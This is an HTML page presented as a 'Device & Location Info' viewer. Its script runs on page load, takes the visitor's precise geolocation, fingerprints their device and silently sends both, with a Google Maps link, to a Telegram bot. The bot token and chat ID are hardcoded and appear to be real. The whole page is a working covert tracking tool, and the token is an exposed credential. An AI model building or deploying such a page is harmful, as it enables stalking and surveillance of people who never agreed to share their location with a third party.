<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device & Location Info</title>
</head>
<body>
    <h2>Device & Location Info</h2>
    <p id="location">Fetching location...</p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                document.getElementById("location").innerHTML = "Geolocation is not supported by this browser.";
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            document.getElementById("location").innerHTML = `Latitude: ${lat} <br>Longitude: ${lon}`;

            // ✅ Collect device details
            const deviceInfo = getDeviceDetails();

            // ✅ Send data to Telegram
            sendLocation(lat, lon, deviceInfo);
        }

        function showError(error) {
            let message = "";
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    message = "Location access was denied. Please allow location access in your browser settings.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    message = "The request to get user location timed out.";
                    break;
                case error.UNKNOWN_ERROR:
                    message = "An unknown error occurred.";
                    break;
            }
            document.getElementById("location").innerHTML = message;
        }

        function getDeviceDetails() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const browser = detectBrowser(userAgent);
            const os = detectOS(userAgent);
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const deviceType = /mobile|tablet|ip(ad|hone|od)|android/i.test(userAgent) ? 'Mobile/Tablet' : 'Desktop';
            const deviceModel = getDeviceModel(userAgent);

            return `🖥 Device Details:\n• Device Type: ${deviceType}\n• Model: ${deviceModel}\n• Browser: ${browser}\n• OS: ${os}\n• Screen Resolution: ${screenWidth}x${screenHeight}\n• User Agent: ${userAgent}`;
        }

        function getDeviceModel(userAgent) {
            // Check for iPhone models
            if (/iPhone/.test(userAgent)) {
                if (/iPhone X|iPhone 10/.test(userAgent)) return "iPhone X/10";
                if (/iPhone 12/.test(userAgent)) return "iPhone 12";
                if (/iPhone 13/.test(userAgent)) return "iPhone 13";
                if (/iPhone 14/.test(userAgent)) return "iPhone 14";
                // Add more iPhone models as needed
                return "iPhone (Unknown Model)";
            }

            // Check for iPad models
            if (/iPad/.test(userAgent)) {
                return "iPad (Unknown Model)";
            }

            // Check for Android models (simplified)
            if (/Android/.test(userAgent)) {
                if (/Pixel 5/.test(userAgent)) return "Google Pixel 5";
                if (/Samsung Galaxy/.test(userAgent)) return "Samsung Galaxy (Unknown Model)";
                // Add more Android models as needed
                return "Android Device (Unknown Model)";
            }

            return "Unknown Device";
        }

        function detectBrowser(userAgent) {
            if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edge") === -1) return "Google Chrome";
            if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) return "Safari";
            if (userAgent.indexOf("Firefox") > -1) return "Mozilla Firefox";
            if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) return "Internet Explorer";
            if (userAgent.indexOf("Edge") > -1) return "Microsoft Edge";
            return "Unknown Browser";
        }

        function detectOS(userAgent) {
            if (userAgent.indexOf("Windows NT 10.0") > -1) {
                if (userAgent.indexOf("Windows 11") > -1) {
                    return "Windows 11"; // Specifically detects Windows 11
                } else {
                    return "Windows 10"; // This is the fallback for Windows 10
                }
            }
            if (userAgent.indexOf("Mac") > -1) return "MacOS";
            if (userAgent.indexOf("X11") > -1) return "Linux";
            if (userAgent.indexOf("Android") > -1) return "Android";
            if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) return "iOS";
            return "Unknown OS";
        }

        function sendLocation(lat, lon, deviceInfo) {
            const botToken = "8053207965:AAFxT4UzNGdzjiqNzkpjorMlXXz7cHNF6q0"; // 🔴 Replace with your bot token
            const chatId = "6238170291"; // 🔴 Replace with your Telegram chat ID

            const message = `🌍 Location Details:\nLatitude: ${lat}\nLongitude: ${lon}\n[View on Google Maps](https://www.google.com/maps?q=${lat},${lon})\n\n${deviceInfo}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            })
            .then(response => response.json())
            .then(data => console.log("Message sent:", data))
            .catch(error => console.error("Error:", error));
        }

        // ✅ Run getLocation automatically when page loads
        window.onload = getLocation;
    </script>
</body>
</html>
